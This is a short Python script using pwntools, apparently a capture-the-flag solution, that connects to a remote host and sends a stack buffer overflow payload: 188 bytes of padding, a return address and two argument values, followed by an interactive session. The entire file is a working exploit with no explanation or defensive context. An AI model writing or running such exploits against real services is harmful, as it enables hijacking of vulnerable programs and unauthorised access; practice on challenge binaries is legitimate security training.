from pwn import *

# Establish connection
conn = remote('94.237.62.166',52699)

# Construct the payload
payload = flat(
    b"A" * 188 ,
    0x080491e2,
    0x0,
    0xdeadbeef,
    0xc0ded00d
    )

# Send payload
conn.sendlineafter(b':', payload)

# Interact with the server
conn.interactive()
